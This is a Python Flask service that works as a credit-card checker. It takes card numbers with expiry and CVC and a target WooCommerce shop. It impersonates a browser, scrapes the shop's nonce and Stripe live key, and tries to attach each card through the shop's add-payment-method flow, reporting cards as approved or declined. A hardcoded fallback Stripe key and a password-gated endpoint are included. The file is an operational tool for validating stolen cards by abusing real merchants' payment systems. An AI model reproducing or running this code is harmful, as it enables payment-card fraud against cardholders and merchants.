from flask import Flask, jsonify, render_template_string, request
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from curl_cffi import requests as curlr
import uuid
import time
import re
import random
import os
import logging
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)
executor = ThreadPoolExecutor(max_workers=10)
ua = UserAgent()

@app.route('/')
def home():
    # Your original UI HTML remains here
    return render_template_string("""...""") 

def extract_nonce(html):
    soup = BeautifulSoup(html, 'html.parser')
    # Check common WooCommerce/Stripe nonce fields
    nonce_fields = ['_ajax_nonce', 'wc-stripe-confirm-payment-nonce', 'stripe_confirm_payment_nonce']
    for field in nonce_fields:
        tag = soup.find('input', {'name': field})
        if tag and tag.get('value'):
            return tag['value']
    # Fallback: Regex for JSON-embedded nonces
    match = re.search(r'["\']nonce["\']\s*:\s*["\']([a-f0-9]{10,})["\']', html)
    return match.group(1) if match else None

def get_stripe_key(html):
    match = re.search(r'pk_live_[a-zA-Z0-9_]+', html)
    return match.group(0) if match else "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"

def process_card_enhanced(domain, ccx):
    try:
        # 1. Setup Session with Browser Impersonation
        session = curlr.Session(impersonate="chrome110")
        card_num, mm, yy, cvc = ccx.strip().split("|")
        if len(yy) == 4: yy = yy[2:]

        # 2. Establish Session (Landing on Cart/Account)
        # Required for PianoPronto to set cookies and generate nonces
        base_url = f"https://{domain}"
        landing = session.get(f"{base_url}/my-account/add-payment-method/", timeout=20)
        
        if landing.status_code == 403:
            return {"Response": "Cloudflare Blocked Render IP", "Status": "Declined"}

        # 3. Extract Data
        nonce = extract_nonce(landing.text)
        stripe_key = get_stripe_key(landing.text)
        
        if not nonce:
            return {"Response": "Nonce Extraction Failed (Site Security)", "Status": "Declined"}

        # 4. Create Stripe Payment Method
        pm_payload = {
            'type': 'card',
            'card[number]': card_num,
            'card[cvc]': cvc,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'billing_details[address][country]': 'US',
            'key': stripe_key
        }
        pm_res = session.post("https://api.stripe.com/v1/payment_methods", data=pm_payload)
        pm_data = pm_res.json()
        
        if 'id' not in pm_data:
            return {"Response": pm_data.get('error', {}).get('message', 'PM Creation Failed'), "Status": "Declined"}
        
        pm_id = pm_data['id']

        # 5. Confirm with WooCommerce
        confirm_payload = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            '_ajax_nonce': nonce
        }
        final_res = session.post(f"{base_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", data=confirm_payload)
        
        if "succeeded" in final_res.text or "Card added" in final_res.text:
            return {"Response": "Card Added Successfully", "Status": "Approved"}
        
        return {"Response": "Gateway Declined", "Status": "Declined"}

    except Exception as e:
        return {"Response": f"System Error: {str(e)}", "Status": "Error"}

@app.route('/process')
def process_request():
    if request.args.get('key') != "inferno":
        return jsonify({"error": "Unauthorized"}), 401
    
    site = request.args.get('site').replace("https://", "").replace("http://", "").split('/')[0]
    cc = request.args.get('cc')
    return jsonify(process_card_enhanced(site, cc))

@app.route('/health')
def health():
    return jsonify({"status": "healthy"}), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
